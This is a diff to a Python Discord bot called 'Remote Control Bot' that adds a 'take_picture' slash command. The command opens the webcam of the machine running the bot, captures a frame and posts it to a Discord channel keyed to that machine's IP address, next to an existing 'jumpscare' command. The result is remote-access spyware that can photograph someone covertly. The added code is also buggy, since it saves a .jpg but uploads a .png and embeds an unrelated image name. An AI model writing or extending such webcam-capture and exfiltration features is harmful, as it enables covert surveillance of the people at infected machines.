@@ -907,13 +907,41 @@ async def jumpscare(interaction: nextcord.Interaction):
         embed.set_image(url=f"attachment://status.png")
         embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
-        await asyncio.sleep(1)
-
         await interaction.send(embed=embed, file=file)
         print("Screenshot sent")
         print("Closing jumpscare...")
         cv2.destroyAllWindows()
-        
+
+@client.slash_command(guild_ids=testServerId, description="Takes a picture using the client's camera.")
+async def take_picture(interaction: nextcord.Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        print("Take picture command received")
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            await interaction.response.send_message("Camera not found.")
+            print("Camera not found")
+            return
+        print("Camera found")
+        await interaction.response.send_message("Taking picture...")
+        ret, frame = cap.read()
+        if not ret:
+            await interaction.edit_original_message(content="Error taking picture.")
+            print("Error taking picture")
+            return
+        print("Picture taken")
+        cv2.imwrite("captured_image.jpg", frame)
+        print("Image captured and saved as captured_image.jpg")
+        cap.release()
+
+        file = nextcord.File(os.path.join(os.path.abspath(os.path.dirname(__file__)), 'captured_image.png'), filename='captured_image.png')
+        embed = nextcord.Embed(title="Webcam picture: ", timestamp=datetime.now(), colour=0x00ffae)
+        embed.set_author(name="Remote Control Bot")
+        embed.set_image(url=f"attachment://status.png")
+        embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
+
+        await interaction.send(embed=embed, file=file)
+        print("Picture sent")
 
         
 @client.event
